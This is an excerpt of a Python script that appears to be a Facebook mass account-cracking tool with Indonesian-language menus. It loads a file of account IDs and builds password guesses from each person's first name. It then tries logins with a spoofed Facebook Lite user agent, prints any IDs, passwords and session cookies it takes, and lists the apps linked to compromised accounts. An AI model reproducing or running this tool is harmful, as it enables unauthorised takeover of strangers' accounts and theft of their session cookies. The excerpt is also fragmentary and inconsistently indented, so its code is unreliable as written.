...
ua = ["Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20",]
...
def menu():
	...
	_IPYTHONI_(f'\x1b[1;92m《 1 》▬▬●▒░Crack File▒░▬▬●🎯  ')
	print('\033[1;92m⋘────────────────────────────────────≫≫')
	_____IPYTHONI_____ = input('\x1b[1;91m｛Pilih｝➟  \x1b[1;97m ')
	if _____IPYTHONI_____ in ['1']:
		F()
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m {Halbzhera Damax}😂 ')
		back()
def error():
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\033[1;93m〚𝔼ℕ𝕋𝔼ℝ 𝕐𝕆𝕌ℝ 𝔽𝕀𝕃𝔼〛 :  ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;31m[\033[1;32m•\033[1;31m]\033[1;32mIDZ : \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
...
def Settings():
    print('\033[0;97m---------------------------------------')
    print(f"\033[0;97m[\033[0;91m 1\033[0;97m ] \033[0;92mRANDOM ❨MIX❩")
    hu = input('\033[0;97m[ \033[0;91m+ \033[0;97m] \033[0;97mSELECT : \033[0;92m')
    print('\033[0;97m---------------------------------------')
    if hu in ['1','.11']:
        ...
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print(f"\033[0;97m[ \033[0;91m1 \033[0;97m] \033[0;92mMETHODE-M ")
    hc = input('\033[0;97m[ \033[0;91m+ \033[0;97m] \033[0;97mSELECT : \033[0;92m')
    print('\033[0;97m---------------------------------------')
    if hc in ['1','01']:
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<5:
					...
					pwv.append(frs+'1235678')
					pwv.append(frs+'12356789')
					pwv.append(frs+'1122')
					pwv.append(frs+frs)
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
...
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([K,h,Z,N,O,U,H])
	sys.stdout.write(f"\r⎮{bo}{loop}{Z}⎮{Z}{len(id)}{P} [{bo}OK{bo}{ok}{P}] [{Z}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;220m{idf} | {pw} | {ua}')
                print('\x1b[38;5;189m╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍')
                ...
                print(f'\r\x1b[38;5;48m{idf} | {pw} | \x1b[38;5;48m{kuki}')
                print('\x1b[38;5;189m╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍')
...
def cek_DALLL(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s\x1b[38;5;48m ➟ %\x1b[38;5;48ms\x1b[38;5;48m%\x1b[38;5;48ms\x1b[38;5;48m"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r%s\x1b[38;5;48m %\x1b[38;5;48ms\x1b[38;5;48m"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
